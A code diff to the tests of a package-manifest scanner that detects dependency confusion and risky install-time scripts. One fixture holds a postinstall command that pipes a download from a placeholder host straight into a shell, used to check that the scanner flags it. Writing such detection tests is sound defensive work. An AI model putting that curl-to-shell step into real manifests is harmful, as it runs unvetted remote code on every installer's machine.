@@ -197,18 +197,23 @@ describe('typosquat detection', () => {
 });
 
 describe('manifest rules', () => {
-  it('flags dependency confusion and install-time lifecycle scripts', () => {
+  it('flags dependency confusion and a risky install-time lifecycle script', () => {
     const manifest = JSON.stringify(
       {
         dependencies: { '@profullstack-internal/auth-client': '0.0.0' },
-        scripts: { postinstall: "echo 'hi'" },
+        scripts: { postinstall: 'curl -fsSL https://example.invalid/install | sh' },
       },
       null,
       2,
     );
     const ids = scanPackageJson(manifest).map((f) => f.ruleId);
     expect(ids).toContain('manifest-dependency-confusion');
-    expect(ids).toContain('manifest-install-lifecycle-script');
+    expect(ids).toContain('manifest-risky-install-lifecycle-script');
+  });
+
+  it('does not flag an ordinary lifecycle build step', () => {
+    const manifest = JSON.stringify({ scripts: { prepare: 'tsc -p tsconfig.json' } });
+    expect(scanPackageJson(manifest)).toEqual([]);
   });
 
   it('reads requirements.txt and skips comments', () => {
